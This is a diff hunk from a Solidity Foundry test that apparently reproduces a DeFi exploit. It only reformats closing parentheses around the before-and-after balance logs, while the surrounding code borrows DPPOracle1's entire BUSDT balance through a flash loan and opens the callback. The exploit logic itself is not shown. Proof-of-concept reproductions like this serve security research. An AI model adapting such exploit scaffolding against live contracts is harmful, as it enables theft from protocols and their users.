@@ -70,13 +70,13 @@ contract DDTest is Test {
         deal(address(BUSDT), address(this), 0);
         emit log_named_decimal_uint(
             "BUSDT attacker balance before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
-            );
+        );
 
         DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
 
         emit log_named_decimal_uint(
             "BUSDT attacker balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
-            );
+        );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
